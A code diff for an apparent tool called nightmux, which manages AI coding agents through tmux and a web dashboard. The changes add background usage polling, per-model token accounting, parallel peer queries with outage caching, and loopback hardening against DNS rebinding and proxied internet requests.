@@ -10599,7 +11108,7 @@ def replay_tick(cfg, state, now=None):
     _replay["tried"] = now
     rooms = [{"topic": r["topic"], "name": r["name"], "desks": [
         {k: d.get(k) for k in ("agent", "session", "live", "state", "queued")} for d in r["desks"]]}
-        for r in office_snapshot(cfg, state)["rooms"]]
+        for r in office_snapshot(cfg, state, usage=False)["rooms"]]
     sig = json.dumps(rooms, sort_keys=True)
     if sig == _replay["sig"] and now - _replay["at"] < REPLAY_EVERY:
         return
@@ -10657,7 +11166,7 @@ def look_cmd(cfg, arg):
         + " · the office picks it up on its next refresh"
 
 
-def office_snapshot(cfg, state):
+def office_snapshot(cfg, state, usage=True):
     """Every topic as a room, every agent on its bench as a desk.
 
     Read from what the watcher already captured this tick (st["scr"], the
@@ -10695,48 +11204,49 @@ def office_snapshot(cfg, state):
             desks.append(desk)
         rooms.append({"topic": topic, "name": names.get(topic) or cur, "desks": desks})
     
-    fresh = max(snaps, key=lambda s: s.get("ts", 0), default={})   # account-wide
-    
-    # Extract models and mocked limits for agy and opencode
-    usage = {k: (window(fresh, k) or {}).get("used_percentage") for k in ("five_hour", "seven_day")}
-    try:
-        import os
-        # agy
-        agy_set = os.path.expanduser("~/.gemini/antigravity-cli/settings.json")
-        if os.path.exists(agy_set):
-            with open(agy_set) as f:
-                usage["agy_model"] = json.load(f).get("model", "Unknown")
-        else: usage["agy_model"] = "Unknown"
-        
-        # opencode
-        oc_set = os.path.expanduser("~/.config/opencode/opencode.json")
-        if os.path.exists(oc_set):
-            with open(oc_set) as f:
-                usage["oc_model"] = json.load(f).get("model", "Unknown")
-        else: usage["oc_model"] = "Unknown"
-        
-        try:
-            agy_usage = agy_limits()
-            if agy_usage["at"]:
-                if "claude" in usage.get("agy_model", "").lower() or "gpt" in usage.get("agy_model", "").lower():
-                    usage["agy_limit"] = agy_usage["claude_pct"]
-                else:
-                    usage["agy_limit"] = agy_usage["pct"]
-            else:
-                usage["agy_limit"] = 0
-            
-            ch = analyze_chats(1).get("agents", {})
-            o = ch.get("opencode", {}).get("tokens", {})
-            o_tot = sum(o.values()) if isinstance(o, dict) else 0
-            usage["oc_limit"] = min(100, (o_tot / 2_000_000) * 100) if o_tot else 0
-        except Exception:
-            usage["agy_limit"] = 0
-            usage["oc_limit"] = 0
-    except:
-        pass
+    out = {"rooms": rooms, "installed": installed_agents(cfg), "now": now,
+           "looks": cfg.get("looks") or {}}
+    if usage:
+        fresh = max(snaps, key=lambda s: s.get("ts", 0), default={})   # account-wide
+        out["usage"] = {k: (window(fresh, k) or {}).get("used_percentage")
+                        for k in ("five_hour", "seven_day")}
+        out["usage"].update(office_extras())
+    return out
 
-    return {"rooms": rooms, "installed": installed_agents(cfg), "now": now, "looks": cfg.get("looks") or {},
-            "usage": usage}
+
+def _model_of(path):
+    try:
+        with open(os.path.expanduser(path)) as f:
+            return json.load(f).get("model") or "Unknown"
+    except (OSError, ValueError, AttributeError):
+        return "Unknown"
+
+
+_oc = {"tried": 0, "tok": 0}
+
+
+def _oc_tokens():
+    try:
+        o = analyze_chats(1).get("agents", {}).get("opencode", {}).get("tokens", {})
+        _oc["tok"] = sum(o.values()) if isinstance(o, dict) else 0
+    except Exception as e:          # a thread: nobody else will ever see this
+        print(f"office: opencode tokens: {e}", file=sys.stderr, flush=True)
+
+
+def office_extras():
+    """agy's and opencode's bars on the office page. Neither is read on the caller's
+    thread: `agy -p /usage` and the chat scan take seconds and the office is asked
+    while the daemon's lock is held, so each refreshes on its own thread and the page
+    gets the last reading (0 until the first one lands)."""
+    if time.time() - _oc["tried"] >= 600:
+        _oc["tried"] = time.time()
+        threading.Thread(target=_oc_tokens, daemon=True).start()
+    agy_model, a = _model_of("~/.gemini/antigravity-cli/settings.json"), agy_limits()
+    return {"agy_model": agy_model, "oc_model": _model_of("~/.config/opencode/opencode.json"),
+            "agy_limit": (a["claude_pct"] if re.search("claude|gpt", agy_model, re.I)
+                          else a["pct"]) if a["at"] else 0,
+            # ponytail: opencode publishes no cap; 2M tokens in a day is this bar's full scale
+            "oc_limit": min(100, _oc["tok"] / 20_000)}
 
 
 
@@ -11334,7 +11844,7 @@ def _chat_bucket(stats, agent):
         "sessions": 0, "prompts": 0, "prompt_chars": 0, "nudges": 0, "requests": 0,
         "input": 0, "cache_read": 0, "cache_write": 0, "output": 0, "thinking": 0,
         "errors": 0, "max_ctx": 0, "big_ctx": 0, "models": {}, "nudge_text": {},
-        "projects": {}, "at": {}, "days": {}})
+        "projects": {}, "at": {}, "days": {}, "by_model": {}})
 
 
 def _chat_when(b, ts, cwd):
@@ -11380,6 +11890,9 @@ def _chat_call(b, model, inp, cread, cwrite, out, think=0, day=None):
     b["big_ctx"] += ctx > 150000
     if model:
         b["models"][model] = b["models"].get(model, 0) + ctx + out
+        t = b["by_model"].setdefault(model, [0, 0, 0, 0])     # what a price is applied to
+        for i, n in enumerate((inp, cread, cwrite, out)):
+            t[i] += n
 
 
 def _scan_claude(stats, home, since):
@@ -11391,7 +11904,7 @@ def _scan_claude(stats, home, since):
             p = os.path.join(dirpath, n)
             if not n.endswith(".jsonl") or os.path.getmtime(p) < since:
                 continue
-            seen, counted = set(), False
+            seen, calls, counted = set(), {}, False
             with open(p, encoding="utf-8", errors="replace") as f:
                 for line in f:
                     if '"usage"' not in line and '"type":"user"' not in line:
@@ -11408,20 +11921,25 @@ def _scan_claude(stats, home, since):
                         if (isinstance(c, str) and not d.get("isMeta")
                                 and not d.get("isSidechain") and not c.startswith("<")):
                             _chat_prompt(b, c, _iso_ts(d.get("timestamp")), d.get("cwd"))
-                    elif m.get("usage") and d.get("requestId") not in seen:
-                        seen.add(d.get("requestId"))
-                        u = m["usage"]
+                    elif m.get("usage"):
+                        u, rid = m["usage"], d.get("requestId")
                         if m.get("model") == "<synthetic>":
-                            b["errors"] += 1
+                            if rid not in seen:
+                                b["errors"] += 1
+                                seen.add(rid)
                             continue
-                        _chat_call(b, m.get("model"), u.get("input_tokens") or 0,
-                                   u.get("cache_read_input_tokens") or 0,
-                                   u.get("cache_creation_input_tokens") or 0,
-                                   u.get("output_tokens") or 0,
-                                   (u.get("output_tokens_details") or {}).get("thinking_tokens") or 0,
-                                   d.get("timestamp", "")[:10])
+                        # One line per content block, and only the last holds the
+                        # request's final output_tokens: the first runs ~9% short.
+                        calls[rid] = (m.get("model"), u.get("input_tokens") or 0,
+                                      u.get("cache_read_input_tokens") or 0,
+                                      u.get("cache_creation_input_tokens") or 0,
+                                      u.get("output_tokens") or 0,
+                                      (u.get("output_tokens_details") or {}).get("thinking_tokens") or 0,
+                                      d.get("timestamp", "")[:10])
                     if not counted:
                         counted, b["sessions"] = True, b["sessions"] + 1
+            for c in calls.values():
+                _chat_call(b, *c)
 
 
 def _scan_codex(stats, home, since):
@@ -11629,7 +12147,9 @@ def chat_tips(stats):
                 tips.append((a, f"each call carries {avg / 1000:.0f}k tokens of context "
                              f"({s['big_ctx']} calls over 150k): /clear between unrelated "
                              "tasks, /compact sooner, keep CLAUDE.md/AGENTS.md lean, name the "
-                             "files instead of letting it read the tree"))
+                             "files instead of letting it read the tree"
+                             + ("; !autocompact 150k also makes Claude compact itself mid-turn "
+                                "near 120k instead of 170k" if a == "claude" else "")))
         if s["prompts"] >= 10:
             nud = s["nudges"] / s["prompts"]
             if nud > 0.2:
@@ -11669,24 +12189,32 @@ def chat_tips(stats):
     return tips
 
 
-_agy_usage = {"at": 0, "pct": 0, "claude_pct": 0}
+_agy_usage = {"at": 0, "tried": 0, "pct": 0, "claude_pct": 0}
+
 
 def agy_limits():
-    import subprocess, time, re
-    if time.time() - _agy_usage["at"] < 300:
-        return _agy_usage
-    try:
-        r = subprocess.run(["agy", "-p", "/usage"], capture_output=True, text=True, timeout=5)
-        m_gem = re.search(r"Gemini Models\s+Five Hour Limit Remaining\s+(\d+)%", r.stdout)
-        m_cla = re.search(r"Claude and GPT models\s+Five Hour Limit Remaining\s+(\d+)%", r.stdout)
-        if m_gem:
-            _agy_usage["pct"] = 100 - int(m_gem.group(1))
-        if m_cla:
-            _agy_usage["claude_pct"] = 100 - int(m_cla.group(1))
-        _agy_usage["at"] = time.time()
-    except Exception:
-        pass
+    """agy's last /usage reading. Never waits for agy: the office and /api/metrics ask
+    while holding the daemon's lock and `agy -p` takes seconds. A reading older than
+    five minutes is refreshed on a thread, and a failed one is not retried sooner."""
+    if time.time() - _agy_usage["tried"] >= 300:
+        _agy_usage["tried"] = time.time()
+        threading.Thread(target=_agy_read, daemon=True).start()
     return _agy_usage
+
+
+def _agy_read():
+    try:
+        r = subprocess.run(["agy", "-p", "/usage"], capture_output=True, text=True, timeout=5,
+                           stdin=subprocess.DEVNULL)
+    except (OSError, subprocess.SubprocessError):
+        return
+    m_gem = re.search(r"Gemini Models\s+Five Hour Limit Remaining\s+(\d+)%", r.stdout)
+    m_cla = re.search(r"Claude and GPT models\s+Five Hour Limit Remaining\s+(\d+)%", r.stdout)
+    if m_gem:
+        _agy_usage["pct"] = 100 - int(m_gem.group(1))
+    if m_cla:
+        _agy_usage["claude_pct"] = 100 - int(m_cla.group(1))
+    _agy_usage["at"] = time.time()
 
 
 # Unified Agent Adapter Table: launch command, screen-state detector,
@@ -11815,6 +12343,7 @@ def analyze_chats(days=30, home=None):
             "nudges": sorted(s["nudge_text"].items(), key=lambda kv: -kv[1])[:5],
             "errors": s["errors"],
             "models": dict(sorted(s["models"].items(), key=lambda kv: -kv[1])[:5]),
+            "by_model": s["by_model"],
             "daily": dict(sorted(s["days"].items())),
         }
     out = {"days": days, "at": time.time(), "took": round(time.time() - t0, 1),
@@ -11831,9 +12360,8 @@ def fleet(cfg, path, local, timeout=60):
     names = sorted(cfg.get("peers") or {})
     if not names:
         return [(host_name(cfg), local)]
-    with concurrent.futures.ThreadPoolExecutor(len(names)) as ex:
-        got = list(zip(names, ex.map(lambda n: peer_call(cfg, n, path, timeout=timeout), names)))
-    return [(host_name(cfg), local)] + [(n, r) for n, r in got if isinstance(r, dict)]
+    got = peers_ask(cfg, path, timeout)
+    return [(host_name(cfg), local)] + [(n, r) for n, r in got.items() if isinstance(r, dict)]
 
 
 def fleet_analysis(cfg, days):
@@ -11867,7 +12395,7 @@ def merge_analysis(parts):
         for a, s in (r.get("agents") or {}).items():
             m = acc.setdefault(a, {"sessions": 0, "prompts": 0, "requests": 0, "errors": 0,
                                    "big_ctx": 0, "max_ctx": 0, "tokens": {}, "models": {},
-                                   "nudges": {}, "chars": 0, "nud": 0, "daily": {}})
+                                   "nudges": {}, "chars": 0, "nud": 0, "daily": {}, "by_model": {}})
             n = s.get("prompts") or 0
             for k in ("sessions", "prompts", "requests", "errors", "big_ctx"):
                 m[k] += s.get(k) or 0
@@ -11879,6 +12407,8 @@ def merge_analysis(parts):
             for k, (c, q) in (s.get("daily") or {}).items():
                 d = m["daily"].setdefault(k, [0, 0])
                 d[0], d[1] = d[0] + c, d[1] + q
+            for k, t in (s.get("by_model") or {}).items():
+                m["by_model"][k] = [x + y for x, y in zip(m["by_model"].get(k, [0] * 4), t)]
             m["chars"] += (s.get("avg_prompt") or 0) * n
             m["nud"] += (s.get("nudge_pct") or 0) * n
     for a, m in acc.items():
@@ -11886,7 +12416,7 @@ def merge_analysis(parts):
         ctx = t.get("input", 0) + t.get("cache_read", 0) + t.get("cache_write", 0)
         out["agents"][a] = dict(
             {k: m[k] for k in ("sessions", "prompts", "requests", "errors", "big_ctx", "max_ctx", "tokens")},
-            daily=dict(sorted(m["daily"].items())),
+            daily=dict(sorted(m["daily"].items())), by_model=m["by_model"],
             cache_hit=round(t.get("cache_read", 0) / ctx, 3) if ctx else None,
             avg_ctx=round(ctx / m["requests"]) if ctx and m["requests"] else None,
             avg_prompt=round(m["chars"] / n) if n else None,
@@ -11958,6 +12488,10 @@ def when_summary(cfg, w):
 
 def _k(n):
     return f"{n / 1e9:.1f}B" if n >= 1e9 else f"{n / 1e6:.1f}M" if n >= 1e6 else f"{n / 1e3:.0f}k" if n >= 1e3 else str(n)
+
+
+def _usd(x):
+    return f"${x:,.0f}" if x >= 100 else f"${x:,.2f}"
 
 
 def stats_report(r):
@@ -12453,7 +12987,8 @@ def setup():
         uname = "nm" + secrets.token_hex(6) + "_bot"
         link = f"https://t.me/newbot/{MANAGER_BOT}/{uname}?name=nightmux"
         print("1. Scan this with your phone and tap Create: nightmux makes the bot and\n"
-              "   picks it up itself. Press Enter instead to paste a BotFather token.\n\n"
+              "   picks it up itself, through the maintainer's relay (see SECURITY.md).\n"
+              "   Press Enter instead to paste a BotFather token; it never leaves here.\n\n"
               f"{qr_text(link)}\n   {link}\n   Waiting...")
         token = claim_managed_bot(RELAY_URL, uname)
     if not token:
@@ -12559,6 +13094,7 @@ def restore_startup(cfg, state, lock):
 
 
 # ---------- webhook API + dashboard ----------
+import http.client
 import http.server
 import socketserver
 
@@ -14037,9 +14573,19 @@ async function send(topic, text) {
   setTimeout(poll, 700);
 }
 
+let polling = false, fails = 0;
 async function poll() {
+  // One request at a time, none while the tab is hidden, none that hangs for ever. A poll
+  // slower than the interval used to pile up behind itself, and every failure was
+  // swallowed, so a dead connection looked like a quiet night.
+  if (polling || document.hidden) return;
+  polling = true;
+  const ac = new AbortController(), timer = setTimeout(() => ac.abort(), 8000);
   try {
-    data = await (await fetch(window.PUB ? '/public/' + PUB + '/api' : '/api/office', {cache: 'no-store'})).json();
+    const r = await fetch(window.PUB ? '/public/' + PUB + '/api' : '/api/office', {cache: 'no-store', signal: ac.signal});
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    data = await r.json();
+    fails = 0;
     for (const [k, v] of Object.entries(data.looks || {})) LOOK[k] = Object.assign({}, look(k), v);
     const off = data.rooms.filter(r => r.offline);
     data.rooms = data.rooms.filter(r => !r.offline);
@@ -14047,12 +14593,18 @@ async function poll() {
     document.getElementById('srvs').innerHTML = sv.length > 1 ? sv.map(x =>
       '<span class="sdot" style="background:' + (x.ok ? '#3fb950' : '#f85149') + '"></span>' + esc(x.name)).join('') : '';
     const down = sv.filter(x => !x.ok);
-    document.getElementById('offline').innerHTML = down.length ? down.map(x =>
+    document.getElementById('offline').innerHTML = (data.stale ?
+      '⚠ nightmux is running older code than is on disk. Restart it to use the new version.<br>' : '') +
+      (down.length ? down.map(x =>
       '⚠ <b>' + esc(x.name) + '</b> is not answering — ' +
       (off.filter(r => r.server === x.name).map(r => esc(r.name.split(' · ')[0])).join(', ') || 'no topics') +
-      ' not shown. Check it on the <a href="/#servers">dashboard → servers</a>.').join('<br>') : '';
+      ' not shown. Check it on the <a href="/#servers">dashboard → servers</a>.').join('<br>') : '');
     render();
-  } catch (e) {}
+  } catch (e) {
+    if (++fails >= 2) document.getElementById('offline').textContent = "⚠ can't reach nightmux, retrying…";
+  }
+  clearTimeout(timer);
+  polling = false;
   document.getElementById('clock').textContent = hhmm();
 }
 
@@ -14107,6 +14659,7 @@ if (window.PUB) document.body.classList.add('pub');
 if (sound) document.getElementById('snd').textContent = '🔊';
 if (REPLAY) replay();
 else if (!DEMO && !REEL) { poll(); setInterval(poll, 2000); }
+if (!DEMO && !REEL && !REPLAY) document.addEventListener('visibilitychange', poll);
 // The story runs on 110 ms frames; drawing runs at ~30 fps in between them, so a
 // walk moves a pixel at a time instead of hopping two.
 let lastT = 0;
@@ -14246,8 +14799,9 @@ def peer_call(cfg, name, path, body=None, timeout=10):
     try:
         with urllib.request.urlopen(req, timeout=timeout) as r:
             raw = r.read().decode("utf-8", "replace")
-    except (OSError, ValueError) as e:
-        print(f"peer {name} /{path}: {e}", file=sys.stderr, flush=True)
+    except (OSError, ValueError, http.client.HTTPException) as e:     # a peer cut off mid-answer too
+        if (name, path) not in _peer_down:    # logged once, when it went down
+            print(f"peer {name} /{path}: {e}", file=sys.stderr, flush=True)
         return None
     try:
         return json.loads(raw)
@@ -14255,11 +14809,56 @@ def peer_call(cfg, name, path, body=None, timeout=10):
         return raw
 
 
-def with_peers(cfg, path, data):
-    """Fold every peer's answer for the same route into this machine's.
+_peer_down = {}         # (peer, route) -> when it last failed there (a time ahead while a probe is out)
+# ponytail: per route, so a dead peer costs each route one timeout a minute (less while it is polled);
+# share connection failures across routes if that ever shows.
+PEER_DOWN_FOR = 15
 
-    # ponytail: peers asked one after another, 3s each; parallel if anyone runs many.
+
+def peers_ask(cfg, path, timeout=3):
+    """{peer: its answer, or None when it is down}, every peer asked at once.
+
+    A peer that just failed is not waited on again: it answers None at once and, when
+    PEER_DOWN_FOR has passed, one background probe finds out whether it is back. A
+    dead peer used to put its whole timeout on every poll of the office and the
+    dashboard (the Android service polls every 15 s: on every one of its polls) and a
+    line in the log with it.
+
+    Remembered per route, since a peer too old for one route answers that one 404 and
+    the rest fine. And only while something keeps asking: a failure no poll has looked
+    at for a minute is asked again, so a report run now and then waits for a peer that
+    is back instead of leaving it out.
     """
+    def ask(name):
+        got = peer_call(cfg, name, path, timeout=timeout)
+        if isinstance(got, str):        # a 200 that is no JSON: another service owns that address
+            if (name, path) not in _peer_down:
+                print(f"peer {name} /{path}: not a nightmux answer: {got[:80]!r}", file=sys.stderr, flush=True)
+            got = None
+        if got is None:
+            _peer_down[name, path] = time.time()
+        elif _peer_down.pop((name, path), None):
+            print(f"peer {name} /{path} answers again", file=sys.stderr, flush=True)
+        return got
+
+    names, out, now = sorted(cfg.get("peers") or {}), {}, time.time()
+    for n in names:
+        since = _peer_down.get((n, path))     # read once: a probe can clear it in between
+        if since is None or now - since >= 4 * PEER_DOWN_FOR:
+            continue
+        out[n] = None
+        if now - since >= PEER_DOWN_FOR:
+            _peer_down[n, path] = now + timeout      # no second probe while this one is out
+            threading.Thread(target=ask, args=(n,), daemon=True).start()
+    live = [n for n in names if n not in out]
+    if live:
+        with concurrent.futures.ThreadPoolExecutor(len(live)) as ex:
+            out.update(zip(live, ex.map(ask, live)))
+    return {n: out[n] for n in names}
+
+
+def with_peers(cfg, path, data):
+    """Fold every peer's answer for the same route into this machine's."""
     if not cfg.get("peers"):
         return data
     rows = data["rooms"] if isinstance(data, dict) else data
@@ -14267,8 +14866,7 @@ def with_peers(cfg, path, data):
         r["server"] = host_name(cfg)
     seen = [{"name": host_name(cfg), "ok": True}]
     names = cfg.get("topic_names") or {}
-    for name in sorted(cfg["peers"]):
-        got = peer_call(cfg, name, path.lstrip("/"), timeout=3)
+    for name, got in peers_ask(cfg, path.lstrip("/")).items():
         seen.append({"name": name, "ok": got is not None})
         if got is None:
             # Down is not gone: its topics still show, marked, instead of
@@ -14298,6 +14896,33 @@ def with_peers(cfg, path, data):
 # config as a peer and installs the service. Nobody edits JSON on either side.
 JOIN_FOR, PEER_PORT = 1800, 9091
 _joins = {}       # token -> expiry
+
+
+def office_url_problem(url):
+    """Why the office link will not open, or None. Only a definite answer counts: a
+    timeout or a name that does not resolve may be this machine's network, not the link."""
+    if not url.startswith(("http://", "https://")):
+        return None
+    try:
+        urllib.request.urlopen(url, timeout=4).close()
+    except urllib.error.HTTPError as e:
+        return None if e.code in (401, 403) else f"answers HTTP {e.code}"
+    except urllib.error.URLError as e:
+        return "refuses the connection" if isinstance(e.reason, ConnectionRefusedError) else None
+    except (OSError, ValueError):
+        pass
+    return None
+
+
+def office_fix(cfg, url):
+    """What to do when the office link leads somewhere else. Usually the tailnet name's
+    port 443 already belongs to another service, and routing /office through a Funnel
+    would put the dashboard on the internet: a port of its own is tailnet only."""
+    port = cfg.get("webhook_port") or 9090
+    host = urllib.parse.urlsplit(url).hostname or "<this machine>.<tailnet>.ts.net"
+    return (f"give nightmux a port of its own, reachable from your tailnet only:\n"
+            f"  tailscale serve --bg --https={port} {port}\n"
+            f'then "office_url": "https://{host}:{port}/office" in the config and !reload')
 
 
 def public_base(cfg):
@@ -14596,6 +15221,22 @@ def pairing_url(cfg, code):
         ip = get_local_ip()
         base = f"http://{ip}:{port}"
     return f"{base}/pair?code={code}"
+
+
+def phone_pairing(cfg):
+    """What the terminal says about the phone: a QR it can scan, or why there is none.
+
+    A phone cannot reach a dashboard on 127.0.0.1, and the LAN address pairing_url
+    falls back to would be a QR that refuses connections. Mapping the port with
+    `tailscale serve` or binding wider is the owner's call, so say how, don't do it.
+    """
+    port = cfg.get("webhook_port") or 9090
+    if web_host(cfg) in ("127.0.0.1", "localhost", "::1") and not phone_url(cfg):
+        return (f"📱 Phone: the dashboard listens on this machine only, so there is no QR yet.\n"
+                f"   With Tailscale on both devices, run: tailscale serve --bg {port}\n"
+                f"   then press + Pair phone on the dashboard (your tailnet, not the internet).\n")
+    purl = pairing_url(cfg, new_pairing_code())
+    return f"📱 Phone pairing URL: {purl}\nScan with your phone to pair:\n{qr_text(purl)}\n"
 
 
 PAIRED_TOKENS_FILE = os.path.join(STATE_DIR, "paired_tokens.json")
@@ -15155,18 +15796,70 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
 
     def reply(self, body, ctype):
         body = body.encode("utf-8")
+        gz = len(body) > 1024 and "gzip" in (self.headers.get("Accept-Encoding") or "")
+        if gz:                  # the office page's 33 KB poll is 11 KB this way, the replay 556 KB far less
+            body = gzip.compress(body, 5)
         self.send_response(200)
         self.send_header("Content-Type", ctype)
+        if gz:
+            self.send_header("Content-Encoding", "gzip")
+        self.send_header("Vary", "Accept-Encoding")
         self.send_header("Content-Length", str(len(body)))
         self.send_header("Cache-Control", "no-store")
         self.end_headers()
         self.wfile.write(body)
 
+    # What a tunnel or reverse proxy on this machine adds to a request from elsewhere.
+    FORWARDED = ("X-Forwarded-For", "X-Real-Ip", "Cf-Connecting-Ip", "True-Client-Ip")
+    # Names nobody can register publicly, so a DNS-rebinding page cannot use them.
+    OWN_SUFFIXES = (".local", ".lan", ".internal", ".home.arpa", ".ts.net")
+
+    def via_internet(self):
+        """A request over loopback that a proxy says came from a public address.
+        Loopback is open because only this machine can reach it; `tailscale funnel`
+        or a tunnel on this machine breaks that: the peer is 127.0.0.1, the person
+        is on the internet. Tailnet and LAN clients (`tailscale serve`) stay local.
+        """
+        if self.headers.get("Tailscale-Funnel-Request"):
+            return True
+        for name in self.FORWARDED:
+            for ip in (self.headers.get(name) or "").split(","):
+                try:
+                    if ip.strip() and ipaddress.ip_address(ip.strip()).is_global:
+                        return True
+                except ValueError:
+                    return True
+        return False
+
     def is_localhost(self):
         client = getattr(self, "client_address", None)
         if not client:
             return True
-        return client[0] in ("127.0.0.1", "::1", "localhost")
+        return client[0] in ("127.0.0.1", "::1", "localhost") and not self.via_internet()
+
+    def host_ok(self):
+        """DNS rebinding: a page on evil.example whose name flips to 127.0.0.1 after
+        it loads is same-origin with the dashboard and would inherit the open
+        loopback. The browser still sends evil.example as Host. Addresses, one-word
+        names and names under OWN_SUFFIXES pass; a public name has to be listed in
+        "allowed_hosts" (or be office_url / preview_host).
+        """
+        try:
+            name = urllib.parse.urlsplit("//" + (self.headers.get("Host") or "localhost")).hostname
+        except ValueError:
+            return False
+        name = (name or "").rstrip(".")
+        if not name:
+            return False
+        try:
+            ipaddress.ip_address(name)
+            return True
+        except ValueError:
+            pass
+        cfg = getattr(getattr(self, "server", None), "cfg", None) or {}
+        mine = {str(h).lower() for h in cfg.get("allowed_hosts") or []}
+        mine |= {urllib.parse.urlsplit(cfg.get("office_url") or "").hostname, cfg.get("preview_host")}
+        return "." not in name or name.endswith(self.OWN_SUFFIXES) or name in mine
 
     def check_auth(self):
         cookie = self.headers.get("Cookie", "")
@@ -15177,12 +15870,25 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
         return False
 
     def auth_gate(self):
-        """Requests from outside 127.0.0.1 without nm_auth cookie get 401. Localhost stays open."""
-        if self.is_localhost() or self.peer:   # peer_gate already checked the secret
+        """Requests from outside 127.0.0.1 without nm_auth cookie get 401. Loopback stays
+        open, for the names this machine answers to (host_ok)."""
+        clean_path, _, query = self.path.partition("?")
+        # peer_gate already checked the secret; a /public/ link carries its own token.
+        if self.peer or clean_path.startswith("/public/"):
             return True
-        clean_path = self.path.split("?")[0]
-        if clean_path in ("/pair", "/icon.svg", "/manifest.json", "/sw.js") \
-                or clean_path.startswith(("/qr.svg", "/public/", "/peer/")):
+        if self.is_localhost():
+            if self.host_ok():
+                return True
+            self.send_response(403)
+            self.send_header("Content-Type", "text/plain; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(b"Host not allowed. If that is your own name for this machine, "
+                             b"add it to \"allowed_hosts\" in ~/.nightmux.json.\n")
+            return False
+        # Redeeming a pairing code needs no login (the code is the login); asking for one does.
+        if (clean_path == "/pair" and urllib.parse.parse_qs(query).get("code")) \
+                or clean_path in ("/icon.svg", "/manifest.json", "/sw.js") \
+                or clean_path.startswith(("/qr.svg", "/peer/")):
             return True
         if not self.check_auth():
             self.send_response(401)
@@ -15236,9 +15942,9 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
                 return
             c = new_pairing_code()
             purl = pairing_url(self.server.cfg, c)
-            html = PAIR_HTML.replace("__PAIR_URL_ENC__", urllib.parse.quote(purl, safe="")
+            page = PAIR_HTML.replace("__PAIR_URL_ENC__", urllib.parse.quote(purl, safe="")
                                     ).replace("__PAIR_URL__", html.escape(purl))
-            return self.reply(inject_telemetry(self.server.cfg, html), "text/html; charset=utf-8")
+            return self.reply(inject_telemetry(self.server.cfg, page), "text/html; charset=utf-8")
         if self.path == "/api/connect":
             cfg = self.server.cfg
             return self.reply(json.dumps({
@@ -15262,8 +15968,8 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
                 with self.server.lock:
                     data = public_snapshot(self.server.cfg, self.server.state)
                 return self.reply(json.dumps(data), "application/json")
-            html = OFFICE_HTML.replace("<script>", "<script>window.PUB=%s;</script><script>" % json.dumps(tok), 1)
-            return self.reply(inject_telemetry(self.server.cfg, html), "text/html; charset=utf-8")
+            page = OFFICE_HTML.replace("<script>", "<script>window.PUB=%s;</script><script>" % json.dumps(tok), 1)
+            return self.reply(inject_telemetry(self.server.cfg, page), "text/html; charset=utf-8")
         if self.path in ("/", ""):
             return self.reply(inject_telemetry(self.server.cfg, DASHBOARD_HTML), "text/html; charset=utf-8")
         if self.path.startswith("/share/card.svg"):
@@ -15282,8 +15988,7 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
                 lim = agent_limits(cfg, self.server.state)
             out = {"name": host_name(cfg), "server": server_metrics(), "limits": lim}
             if not self.peer:
-                out["peers"] = {n: peer_call(cfg, n, "api/metrics", timeout=3)
-                                for n in sorted(cfg.get("peers") or {})}
+                out["peers"] = peers_ask(cfg, "api/metrics")
             return self.reply(json.dumps(out), "application/json")
         if self.path.startswith("/api/analysis"):
             q = urllib.parse.parse_qs(urllib.parse.urlsplit(self.path).query)
@@ -15368,8 +16073,9 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
             rows = [{"name": host_name(cfg), "me": True, "ok": True, "version": VERSION,
                      "agents": installed_agents(cfg),
                      "topics": sum(1 for t in cfg.get("topics", {}) if not peer_of(cfg, t))}]
+            asked = peers_ask(cfg, "api/agents")
             for n, p_ in sorted((cfg.get("peers") or {}).items()):
-                got = peer_call(cfg, n, "api/agents", timeout=3)
+                got = asked.get(n)          # a !reload in between can add a peer
                 rows.append({"name": n, "me": False, "ok": isinstance(got, dict), "url": p_["url"],
                              "version": (got or {}).get("version") if isinstance(got, dict) else None,
                              "agents": (got or {}).get("installed") if isinstance(got, dict) else [],
@@ -15395,6 +16101,8 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
             with self.server.lock:
                 data = (topics_status if self.path == "/api/topics"
                         else office_snapshot)(self.server.cfg, self.server.state)
+            if self.path == "/api/office":
+                data["stale"] = code_newer_than(BOOT_AT)
             if not self.peer:
                 data = with_peers(self.server.cfg, self.path, data)
             return self.reply(json.dumps(data), "application/json")
@@ -15440,7 +16148,7 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
         body = self.rfile.read(length).decode('utf-8').strip()
         cfg = self.server.cfg
         if self.path == "/api/pair/revoke":
-            if not self.is_localhost() and self.headers.get("X-Nightmux") != "1":
+            if self.headers.get("X-Nightmux") != "1":
                 self.send_response(403)
                 self.end_headers()
                 return
@@ -15449,7 +16157,7 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
             return self.reply(json.dumps({"ok": True, "revoked": count, "msg": f"Revoked {count} paired devices"}),
                               "application/json")
         if self.path == "/api/pair/code":
-            if not self.is_localhost() and self.headers.get("X-Nightmux") != "1":
+            if self.headers.get("X-Nightmux") != "1":
                 self.send_response(403)
                 self.end_headers()
                 return
@@ -15688,10 +16396,41 @@ def restore_held(cfg, state):
 
 
 def web_host(cfg):
-    """Where the dashboard listens. Loopback unless told otherwise: it has no login,
-    so anything that can reach it drives your agents. Docker sets 0.0.0.0 inside the
-    container and publishes the port on the host's loopback only."""
+    """Where the dashboard listens. Loopback unless told otherwise: this machine needs
+    no login and any other client needs a paired device (SECURITY.md), so keep it off
+    the open internet. Docker sets 0.0.0.0 inside the container and publishes the
+    port on the host's loopback only."""
     return cfg.get("webhook_host") or os.environ.get("NIGHTMUX_HOST") or "127.0.0.1"
+
+
+def up_cli(args):
+    """`nightmux up`: the first run with no bot. It checks what the dashboard needs,
+    will not start a second copy, then runs what the service runs: with no token that
+    is the dashboard on this machine, and phone_pairing says how a phone gets to it."""
+    if args:
+        print("usage: nightmux up    (no options; nightmux --setup adds a Telegram bot)", file=sys.stderr)
+        sys.exit(2)
+    if not shutil.which("tmux"):
+        sys.exit("nightmux drives your agents through tmux, and tmux is not installed:\n"
+                 "  sudo apt install tmux  (macOS: brew install tmux)")
+    try:
+        cfg = load_cfg()
+    except (OSError, ValueError):
+        cfg = {}                # first run: main() writes the dashboard-only one
+    port = cfg.get("webhook_port") or 9090
+    try:
